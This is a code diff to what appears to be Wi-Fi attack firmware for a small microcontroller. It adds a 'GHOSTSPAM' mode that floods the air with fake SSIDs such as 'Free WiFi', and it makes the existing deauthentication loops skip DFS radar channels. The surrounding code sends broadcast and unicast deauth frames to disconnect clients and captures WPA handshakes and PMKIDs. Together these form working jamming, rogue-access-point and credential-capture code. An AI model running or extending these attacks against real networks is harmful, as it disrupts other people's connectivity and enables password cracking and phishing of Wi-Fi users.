@@ -67,13 +67,19 @@ const char* rick_roll[8] = {
       "08 and hurt you"
 };
 
+// BEACONSPAM GHOST: a rotating set of "ghost"-flavoured SSIDs (5Ghost's Ghost AP Beacon).
+static const char* ghost_ssids[8] = {
+      "5Ghost", "Ghost_AP", "Free WiFi", "PINGEQUA",
+      "GhostNet", "FreeWifi", "Ghost AP", "Connect"
+};
+
 
 std::vector<WiFiScanResult> scan_results;
 std::vector<int> deauth_wifis, wifis_temp;
 //WiFiServer server(80);
 uint8_t deauth_bssid[6];
 uint16_t deauth_reason = 2;
-bool randomSSID, rickroll;
+bool randomSSID, rickroll, ghostSpam;
 char randomString[19];
 int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 40, 44, 48, 149, 153, 157, 161};
 int portal=0;
@@ -87,6 +93,11 @@ bool useCustomMac=false;
 //int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11};
 extern u8 rtw_get_band_type(void);
 #define FRAMES_PER_DEAUTH 5
+
+// DFS (radar) 5GHz channels: RX-only, never TX deauth here (5Ghost does the same).
+static bool is_dfs_channel(int ch) {
+  return (ch >= 52 && ch <= 64) || (ch >= 100 && ch <= 144);
+}
 String generateRandomString(int len){
   String randstr = "";
   const char setchar[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
@@ -808,6 +819,7 @@ void loop() {
       dauth_n = 0;
       if(cap_active){ wifi_set_promisc(0, NULL, 0); hs_cap = false; cap_active = false; }
       hsg_phase = HSG_IDLE;  // abort any in-flight HSGRAB/PKGRAB
+      ghostSpam = false;
       secured = false;
       strcpy(wpa_pass,"");
       if(readString.length()>5 && !apActive){
@@ -869,6 +881,9 @@ void loop() {
       rickroll =true;
       DEBUG_SER_PRINT("Starting BSSID "+ssid+"\n");
        
+    }else if(readString.substring(0,9)=="GHOSTSPAM"){
+      ghostSpam = true;
+      DEBUG_SER_PRINT("Start GHOSTSPAM\n");
     }else if(readString.substring(0,6)=="PORTAL"){
       portal = readString.substring(7,readString.length()-1).toInt();
        
@@ -1380,17 +1395,19 @@ void loop() {
     }
   } else if (hsg_phase == HSG_DEAUTH) {
     wext_set_channel(WLAN0_NAME, hsg_ch);
-    for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
-      wifi_tx_deauth_frame(hsg_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 6);
-      delay(5);
-    }
-    // Unicast both directions to each discovered STA — broadcast deauth is often ignored.
-    uint8_t sn = sta_n;
-    for (uint8_t k = 0; k < sn && k < 8; k++) {
-      wifi_tx_deauth_frame(hsg_bssid, (void *)sta_list[k].mac, 6);   // AP -> STA
-      delay(5);
-      wifi_tx_deauth_frame((void *)sta_list[k].mac, hsg_bssid, 6);   // STA -> AP
-      delay(5);
+    if (!is_dfs_channel(hsg_ch)) {   // DFS: RX-only
+      for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
+        wifi_tx_deauth_frame(hsg_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 6);
+        delay(5);
+      }
+      // Unicast both directions to each discovered STA — broadcast deauth is often ignored.
+      uint8_t sn = sta_n;
+      for (uint8_t k = 0; k < sn && k < 8; k++) {
+        wifi_tx_deauth_frame(hsg_bssid, (void *)sta_list[k].mac, 6);   // AP -> STA
+        delay(5);
+        wifi_tx_deauth_frame((void *)sta_list[k].mac, hsg_bssid, 6);   // STA -> AP
+        delay(5);
+      }
     }
     if (millis() - hsg_t >= hsg_deauth_ms) {
       if (hsg_pmkid) wifi_set_promisc(3, promisc_pmkid_cb, 0);
@@ -1415,13 +1432,15 @@ void loop() {
     dauth_t* t = &dauth_list[dauth_idx];
     static const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
     wext_set_channel(WLAN0_NAME, t->ch);
-    const uint8_t* dst = t->have_client ? t->client : bcast;
-    digitalWrite(LED_R, HIGH);
-    for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
-      wifi_tx_deauth_frame(t->bssid, (void *)dst, deauth_reason);
-      delay(5);
+    if (!is_dfs_channel(t->ch)) {   // DFS: RX-only
+      const uint8_t* dst = t->have_client ? t->client : bcast;
+      digitalWrite(LED_R, HIGH);
+      for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
+        wifi_tx_deauth_frame(t->bssid, (void *)dst, deauth_reason);
+        delay(5);
+      }
+      digitalWrite(LED_R, LOW);
     }
-    digitalWrite(LED_R, LOW);
     dauth_idx = (dauth_idx + 1) % dauth_n;
     delay(50);
   }
@@ -1469,6 +1488,16 @@ void loop() {
       wext_set_channel(WLAN0_NAME,v+1);
       for(int x=0;x<5;x++){
        wifi_tx_beacon_frame(randomString,(void *)"\xFF\xFF\xFF\xFF\xFF\xFF",ssid_cstr2);
+      }
+    }
+  }
+  if (ghostSpam){
+    digitalWrite(LED_G, !digitalRead(LED_G));
+    for (int v = 0; v < 8; v++){
+      const char * ssid_cstr2 = ghost_ssids[v];
+      wext_set_channel(WLAN0_NAME, v+1);
+      for(int x=0;x<5;x++){
+        wifi_tx_beacon_frame((void *)"\x00\xE0\x4C\x01\x02\x03",(void *)"\xFF\xFF\xFF\xFF\xFF\xFF",ssid_cstr2);
       }
     }
   }
